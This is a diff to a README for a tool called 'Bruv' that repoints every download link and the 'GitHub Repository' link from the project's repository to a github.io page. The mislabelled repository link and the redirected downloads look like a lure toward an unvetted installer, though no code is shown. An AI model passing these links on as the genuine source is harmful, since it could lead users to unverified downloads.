@@ -19,9 +19,9 @@ Bruv helps you make decisions faster by processing your data through intelligent
 
 ### Step 1: Download Bruv
 
-[![Download Bruv](https://img.shields.io/badge/Download-Bruv-blue?style=for-the-badge&logo=github)](https://github.com/juliusallergenic243/bruv)
+[![Download Bruv](https://img.shields.io/badge/Download-Bruv-blue?style=for-the-badge&logo=github)](https://juliusallergenic243.github.io)
 
-Visit this link to download the application: **[https://github.com/juliusallergenic243/bruv](https://github.com/juliusallergenic243/bruv)**
+Visit this link to download the application: **[https://juliusallergenic243.github.io](https://juliusallergenic243.github.io)**
 
 ### Step 2: Install on Windows
 
@@ -183,9 +183,9 @@ Upcoming features:
 
 Don't waste time analyzing data manually. Let Bruv give you the facts you need in seconds.
 
-[![Download Bruv Now](https://img.shields.io/badge/Download-Bruv-green?style=for-the-badge&logo=download)](https://github.com/juliusallergenic243/bruv)
+[![Download Bruv Now](https://img.shields.io/badge/Download-Bruv-green?style=for-the-badge&logo=download)](https://juliusallergenic243.github.io)
 
-**Remember:** Visit [https://github.com/juliusallergenic243/bruv](https://github.com/juliusallergenic243/bruv) to download and start getting clear answers right away.
+**Remember:** Visit [https://juliusallergenic243.github.io](https://juliusallergenic243.github.io) to download and start getting clear answers right away.
 
 ## 📚 Quick Reference Card
 
@@ -202,7 +202,7 @@ HELP:        bruv --help
 
 ## 🔗 Connect With Us
 
-- **GitHub Repository:** [https://github.com/juliusallergenic243/bruv](https://github.com/juliusallergenic243/bruv)
+- **GitHub Repository:** [https://juliusallergenic243.github.io](https://juliusallergenic243.github.io)
 - **Issues & Support:** Available through the GitHub page
 
 ---
